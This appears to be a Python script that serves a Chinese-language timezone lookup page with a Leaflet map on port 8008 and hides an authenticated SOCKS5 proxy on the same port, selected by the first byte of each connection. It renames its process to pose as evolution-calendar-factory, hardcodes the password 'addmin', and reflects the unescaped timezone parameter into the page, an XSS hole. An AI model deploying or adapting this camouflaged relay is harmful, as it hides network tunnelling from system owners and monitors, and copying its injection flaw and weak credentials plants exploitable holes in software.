import socket
import threading
import struct
import select
import sys
import os
from datetime import datetime
import zoneinfo
from urllib.parse import urlparse, parse_qs
import json

try:
    import setproctitle
except ImportError:
    setproctitle = None

# ========================== [ 配置与模板 START ] ==========================

# 常用时区列表
COMMON_TIMEZONES = sorted([
    "UTC", "Asia/Shanghai", "Asia/Tokyo", "Asia/Dubai", "Asia/Singapore",
    "Europe/London", "Europe/Berlin", "Europe/Paris", "Europe/Moscow",
    "Europe/Warsaw", "America/New_York", "America/Chicago",
    "America/Los_Angeles", "Pacific/Auckland", "Australia/Sydney"
])

# 为时区添加对应的地理坐标 [纬度, 经度, 缩放级别]
TIMEZONE_COORDS = {
    "UTC": [51.5074, -0.1278, 5],
    "Asia/Shanghai": [31.2304, 121.4737, 7],
    "Asia/Tokyo": [35.6895, 139.6917, 7],
    "Asia/Dubai": [25.276987, 55.296249, 8],
    "Asia/Singapore": [1.3521, 103.8198, 8],
    "Europe/London": [51.5074, -0.1278, 8],
    "Europe/Berlin": [52.5200, 13.4050, 8],
    "Europe/Paris": [48.8566, 2.3522, 8],
    "Europe/Moscow": [55.7558, 37.6173, 7],
    "Europe/Warsaw": [52.2297, 21.0122, 8],
    "America/New_York": [40.7128, -74.0060, 7],
    "America/Chicago": [41.8781, -87.6298, 7],
    "America/Los_Angeles": [34.0522, -118.2437, 7],
    "Pacific/Auckland": [-36.8485, 174.7633, 7],
    "Australia/Sydney": [-33.8688, 151.2093, 7]
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>时区时间与地图查询</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f4f7f6; color: #333; }}
        .container {{ width: 500px; background: #fff; border-radius: 10px; box-shadow: 0 4px
 20px rgba(0, 0, 0, 0.1); overflow: hidden; text-align: center; }}
        .header {{ padding: 20px; background-color: #007bff; color: #fff; }}
        .header span {{ font-size: 20px; font-weight: bold; }}
        .content {{ padding: 20px 30px; }}
        form {{ margin-bottom: 15px; }}
        select {{ width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; background-color: white; cursor: pointer; }}
        .result {{ margin-top: 15px; font-size: 18px; color: #333; min-height: 60px; padding: 10px; background-color: #e9ecef; border-radius: 5px; display: flex; justify-content: center; align-items: center; flex-direction: column; line-height: 1.5; }}
        /* 地图容器的样式 */
        #map {{ height: 250px; width: 100%; margin-top: 20px; border-radius: 5px; border: 1px solid #ddd; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span>时区时间与地图查询</span>
        </div>
        <div class="content">
            <form method="GET" action="/">
                <select name="timezone" onchange="this.form.submit()">
                    <option value="" disabled {initial_select_state}>--- 请选择一个时区 ---</option>
                    {options_placeholder}
                </select>
            </form>
            <div class="result">
                {result_placeholder}
            </div>
            <div id="map"></div>
        </div>
    </div>
    <script>
        // 这段 JS 代码由 Python 动态生成
        {map_script_placeholder}
    </script>
</body>
</html>
"""
# ========================== [ 配置与模板 END ] ============================

def generate_html_page(result_html, selected_tz=None):
    options_html = ""
    for tz in COMMON_TIMEZONES:
        is_selected = ' selected' if tz == selected_tz else ''
        options_html += f'<option value="{tz}"{is_selected}>{tz}</option>'

    map_script = ""
    # 如果用户选择了有效的时区，则生成初始化地图的脚本
    if selected_tz and selected_tz in TIMEZONE_COORDS:
        coords = TIMEZONE_COORDS[selected_tz]
        map_script = f"""
        try {{
            // 初始化地图，设置视图中心和缩放级别
            var map = L.map('map').setView({[coords[0], coords[1]]}, {coords[2]});

            // 添加地图图层 (使用OpenStreetMap)
            L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }}).addTo(map);

            // 在中心点添加一个标记
            L.marker({[coords[0], coords[1]]}).addTo(map)
                .bindPopup('<b>{selected_tz}</b>').openPopup();
        }} catch (e) {{
            document.getElementById('map').innerHTML = "地图加载失败，请检查网络连接。";
            console.error(e);
        }}
        """
    else:
        # 如果没有选择时区，显示提示信息
        map_script = "document.getElementById('map').innerHTML = '<div style=\"display:flex;height:100%;align-items:center;justify-content:center;color:#888;\">选择时区后将显示地图</div>';"

    return HTML_TEMPLATE.format(
        options_placeholder=options_html,
        result_placeholder=result_html,
        map_script_placeholder=map_script,
        initial_select_state='selected' if not selected_tz else ''
    )

def handle_http_request(client_socket):
    result_html = "<p>请从下拉菜单中选择一个时区。</p>"
    selected_tz_name = None
    try:
        request_data = client_socket.recv(4096).decode('utf-8', 'ignore')
        if not request_data:
            client_socket.close(); return

        first_line = request_data.split('\r\n')[0]
        if ' ' not in first_line: client_socket.close(); return
        
        path = first_line.split(' ')[1]
        parsed_url = urlparse(path)
        query_params = parse_qs(parsed_url.query)

        selected_tz_name = query_params.get('timezone', [None])[0]

        if selected_tz_name:
            try:
                target_tz = zoneinfo.ZoneInfo(selected_tz_name)
                utc_now = datetime.now(zoneinfo.ZoneInfo("UTC"))
                local_time = utc_now.astimezone(target_tz)
                formatted_time = local_time.strftime('%Y-%m-%d %H:%M:%S %Z')
                result_html = f"<b>{selected_tz_name}</b><br>当前时间: {formatted_time}"
            except Exception as e:
                result_html = f"<p style='color: red;'>查询时发生错误: {e}</p>"
        
        final_html = generate_html_page(result_html, selected_tz_name)
        http_response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(final_html.encode('utf-8'))}\r\n"
            "Connection: close\r\n\r\n"
            f"{final_html}"
        ).encode('utf-8')
        
        client_socket.sendall(http_response)

    except Exception:
        pass
    finally:
        client_socket.close()

# ========================================================================
#  SOCKS5 代理的核心代码
# ========================================================================
PROTOCOL_VERSION = 5
AUTH_METHOD = 0x02

class IPForwarder:
    def __init__(self, credentials):
        self.credentials = credentials

    def process_request(self, client_socket):
        try:
            header = client_socket.recv(2)
            if not header or header[0] != PROTOCOL_VERSION: return
            nmethods = header[1]
            methods = client_socket.recv(nmethods)
            if AUTH_METHOD not in methods:
                client_socket.sendall(struct.pack("!BB", PROTOCOL_VERSION, 0xFF)); return
            client_socket.sendall(struct.pack("!BB", PROTOCOL_VERSION, AUTH_METHOD))
            if not self.authenticate(client_socket): return
            header = client_socket.recv(4)
            if not header or len(header) < 4: return
            ver, cmd, rsv, atyp = struct.unpack("!BBBB", header)
            if ver != PROTOCOL_VERSION or cmd != 0x01:
                self.send_reply(client_socket, 0x07); return
            if atyp == 0x01:
                dest_addr = socket.inet_ntoa(client_socket.recv(4))
            elif atyp == 0x03:
                domain_len = client_socket.recv(1)[0]
                dest_addr = client_socket.recv(domain_len).decode('utf-8')
            elif atyp == 0x04:
                dest_addr = socket.inet_ntop(socket.AF_INET6, client_socket.recv(16))
            else:
                self.send_reply(client_socket, 0x08); return
            dest_port = struct.unpack('!H', client_socket.recv(2))[0]
            try:
                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote_socket.connect((dest_addr, dest_port))
                bind_addr, bind_port = remote_socket.getsockname()
                self.send_reply(client_socket, 0x00, socket.inet_aton(bind_addr), bind_port)
            except Exception:
                self.send_reply(client_socket, 0x01); return
            self.relay_data(client_socket, remote_socket)
        except Exception:
            pass
        finally:
            client_socket.close()

    def authenticate(self, client_socket):
        try:
            header = client_socket.recv(2)
            if not header or header[0] != 0x01: return False
            ulen = header[1]
            username = client_socket.recv(ulen).decode('utf-8')
            plen = client_socket.recv(1)[0]
            password = client_socket.recv(plen).decode('utf-8')
            if self.credentials.get(username) == password:
                client_socket.sendall(struct.pack("!BB", 0x01, 0x00)); return True
            else:
                client_socket.sendall(struct.pack("!BB", 0x01, 0x01)); return False
        except Exception:
            return False

    def send_reply(self, client_socket, rep, bnd_addr=b'\x00\x00\x00\x00', bnd_port=0):
        reply = struct.pack("!BBBB", PROTOCOL_VERSION, rep, 0x00, 0x01) + bnd_addr + struct.pack("!H", bnd_port)
        client_socket.sendall(reply)

    def relay_data(self, client_socket, remote_socket):
        try:
            while True:
                readable, _, _ = select.select([client_socket, remote_socket], [], [], 300)
                if not readable: break
                for sock in readable:
                    data = sock.recv(4096)
                    if not data: return
                    other_sock = remote_socket if sock is client_socket else client_socket
                    other_sock.sendall(data)
        except Exception:
            pass
        finally:
            remote_socket.close()

# ========================================================================          
# 用户信息配置
# ========================================================================
if __name__ == '__main__':
    HOST = '0.0.0.0'
    PORT = 8008
    IP_SERVICE_CREDENTIALS = {'admin': 'addmin'}

# ========================================================================
    if not IP_SERVICE_CREDENTIALS:
        print("错误：IP_SERVICE_CREDENTIALS 字典不能为空。")
        sys.exit(1)

    ip_forwarder = IPForwarder(IP_SERVICE_CREDENTIALS)

    if setproctitle:
        process_name = "/usr/lib/evolution/evolution-calendar-factory -w"
        setproctitle.setproctitle(process_name)
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(100)
    except OSError as e:
        print(f"错误：启动服务器失败，端口 {PORT} 可能已被占用。 {e}")
        sys.exit(1)
    except Exception as e:
        print(f"错误：启动服务器失败。 {e}")
        sys.exit(1)

    print(f"INFO: Service 'system-helper' started successfully. PID: {os.getpid()}")
    print(f"INFO: Listening on {HOST}:{PORT}")
    print(f"INFO: Management interface available at http://127.0.0.1:{PORT}")
    print(f"INFO: Data endpoint registered on port {PORT}. Waiting for connections...")
    print("INFO: Press Ctrl+C to stop the service.")

    while True:
        try:
            client_socket, addr = server_socket.accept()
            first_byte = client_socket.recv(1, socket.MSG_PEEK)
            
            if first_byte == b'\x05':
                handler_thread = threading.Thread(target=ip_forwarder.process_request, args=(client_socket,))
            else:
                handler_thread = threading.Thread(target=handle_http_request, args=(client_socket,))
            
            handler_thread.daemon = True
            handler_thread.start()
        except KeyboardInterrupt:
            print("\nINFO: Shutdown signal received. Stopping service...")
            break
        except Exception:
            pass
    
    server_socket.close()
    print("INFO: Service stopped.")
    sys.exit(0)
